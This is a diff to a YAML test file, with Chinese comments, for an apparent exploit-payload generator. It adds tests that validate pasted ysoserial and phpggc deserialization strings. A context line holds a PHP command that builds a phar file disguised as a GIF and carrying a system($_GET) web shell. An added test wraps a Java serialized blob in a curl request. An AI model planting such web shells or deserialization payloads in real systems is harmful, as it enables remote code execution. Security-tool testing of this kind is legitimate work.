@@ -857,3 +857,55 @@ samples:
     expect:
       # 载荷是一整条 shell 命令，<<payload>> 被换成了要放进 phar 里的代码
       payload: "php -d phar.readonly=0 -r '$p=new Phar(\"shell.jpg\");$p->startBuffering();$p->addFromString(\"a.txt\",\"<?php system($_GET[0]);?>\");$p->setStub(\"GIF89a<?php __HALT_COMPILER(); ?>\");$p->stopBuffering();'"
+
+  # ================= 外部生成器的粘贴位 =================
+  #
+  # ysoserial / phpggc 的产出（或手写的序列化串）贴进来之后，
+  # 工具在这里**唯一能多做的事就是校验**：长度前缀、元素个数、引用编号。
+  # 校验通过不代表链在目标上能用，只代表这串本身是合法的 PHP 序列化。
+
+  - name: 外部生成器 · 粘贴的序列化串合法
+    state:
+      vuln: deser
+      template: deser.php.external.serialized
+      vars: {blob: 'O:1:"A":1:{s:1:"p";r:1;}'}
+      outputs: [raw]
+    expect:
+      # 原样透传，同时过了校验（自引用 r:1 指得回根对象）
+      payload: 'O:1:"A":1:{s:1:"p";r:1;}'
+      syntax: ok
+
+  - name: 外部生成器 · 粘贴的串引用了不存在的号
+    state:
+      vuln: deser
+      template: deser.php.external.serialized
+      vars: {blob: 'O:1:"A":1:{s:1:"p";r:9;}'}
+      outputs: [raw]
+    expect:
+      # 这是**粘贴位最值钱的地方**：phpggc 改了版本、手改链的时候
+      # 引用号很容易指飞，而 PHP 那边只会说 Error at offset N。
+      # 期望值取自真实 PHP：这串在 unserialize 下同样失败。
+      payload: 'O:1:"A":1:{s:1:"p";r:9;}'
+      syntax: fail
+
+  - name: 外部生成器 · PHP base64 粘贴位
+    state:
+      vuln: deser
+      template: deser.php.external.b64
+      vars: {b64: 'TzoxOiJBIjoxOntzOjE6InAiO3I6MTt9'}
+      outputs: [raw]
+    expect:
+      # base64 看不出结构，所以是「没校验」而不是「通过」
+      payload: 'TzoxOiJBIjoxOntzOjE6InAiO3I6MTt9'
+      syntax: unchecked
+
+  - name: 外部生成器 · Java base64 粘贴位
+    state:
+      vuln: deser
+      template: deser.java.external.b64
+      vars: {b64: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHD//w=='}
+      outputs: [raw, curl]
+    expect:
+      # Java 原生序列化的 magic 是 0xACED0005，base64 打头固定是 rO0AB
+      payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHD//w=='
+      outputs: {curl: "curl 'http://example.com/?id=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHD%2F%2Fw%3D%3D'"}
